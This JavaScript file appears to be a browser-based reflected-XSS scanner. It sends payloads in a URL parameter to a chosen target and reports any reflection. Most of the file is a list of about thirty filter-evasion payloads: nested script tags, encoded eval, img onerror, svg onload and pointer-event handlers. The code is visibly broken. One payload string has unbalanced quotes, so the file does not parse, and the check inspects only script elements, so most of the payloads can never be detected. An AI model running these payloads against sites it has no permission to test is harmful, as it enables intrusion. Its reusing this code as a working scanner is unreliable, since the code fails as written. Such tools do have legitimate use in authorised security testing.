function scanForXSS() {
  var url = document.getElementById("url").value;
  var parameter = document.getElementById("parameter").value;
  var variations = parseInt(document.getElementById("variations").value);

  if (!url || !parameter || isNaN(variations)) {
    alert("Please provide valid inputs.");
    return;
  }

  var basePayload = generateXSSPayload();
  var payloads = generatePayloadVariations(basePayload, variations);

  var vulnerabilitiesFound = [];
  var count = 0;

  var loadingIndicator = document.querySelector('.loading-indicator');
  loadingIndicator.style.display = 'block';
  var scanButton = document.querySelector('button');
  scanButton.disabled = true;

  payloads.forEach(function (payload) {
    var requestUrl = url + "?" + parameter + "=" + encodeURIComponent(payload);
    axios.get(requestUrl)
      .then(function (response) {
        var html = response.data;
        if (searchForXSSVulnerabilities(html, payload)) {
          vulnerabilitiesFound.push({ requestUrl: requestUrl, payload: payload });
        }
        count++;
        if (count === payloads.length) {
          displayResults(vulnerabilitiesFound);

          loadingIndicator.style.display = 'none';
          scanButton.disabled = false;
        }
      })
      .catch(function (error) {
        console.log("Error:", error);
        count++;
        if (count === payloads.length) {
          displayResults(vulnerabilitiesFound);

          loadingIndicator.style.display = 'none';
          scanButton.disabled = false;
        }
      });
  });
}

function searchForXSSVulnerabilities(html, payload) {
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, "text/html");
  var scripts = doc.getElementsByTagName("script");

  for (var i = 0; i < scripts.length; i++) {
    if (scripts[i].innerHTML.includes(payload)) {
      return true;
    }
  }

  return false;
}

function generateXSSPayload() {
  return "<script>alert('XSS')</script>";
}

function generatePayloadVariations(basePayload, numVariations) {
  var payloadVariations = [basePayload];
  var xssPayloads = [
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "\">">"<script>alert('XSS')</script>",
    "\">\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>\\u0061lert('22')</script>",
    "<script>eval('\\x61lert(\'33\')')</script>",
    "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
    "<img src=x onerror=alert('XSS');>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "\">\"><img src=x onerror=alert('XSS');>",
    "\">\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<svgonload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)//",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "<svg id=alert(1) onload=eval(id)>",
    "\">\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
    "\">\"><svg/onload=alert(/XSS/)",
    "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
    "<svg><script>alert('33')",
    "<svg><script>alert&lpar;'33'&rpar;",
    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
    "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerup=\"alert(45)\">MOVE HERE</div>"
  ];

  var totalPayloads = xssPayloads.length;

  for (var i = 0; i < numVariations; i++) {
    var randomIndex = Math.floor(Math.random() * totalPayloads);
    var payload = xssPayloads[randomIndex];
    payloadVariations.push(payload);
  }

  return payloadVariations;
}


function generateRandomString(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }

  return result;
}

function displayResults(vulnerabilities) {
  var resultsDiv = document.getElementById("results");
  resultsDiv.innerHTML = "";

  if (vulnerabilities.length > 0) {
    var heading = document.createElement("h3");
    heading.textContent = "XSS vulnerabilities found:";
    resultsDiv.appendChild(heading);

    vulnerabilities.forEach(function (vulnerability) {
      var urlPara = document.createElement("p");
      urlPara.textContent = "URL: " + vulnerability.requestUrl;
      resultsDiv.appendChild(urlPara);

      var payloadPara = document.createElement("p");
      payloadPara.textContent = "Payload: " + vulnerability.payload;
      resultsDiv.appendChild(payloadPara);

      var divider = document.createElement("hr");
      resultsDiv.appendChild(divider);
    });
  } else {
    var para = document.createElement("p");
    para.textContent = "No XSS vulnerabilities detected.";
    resultsDiv.appendChild(para);
  }
}

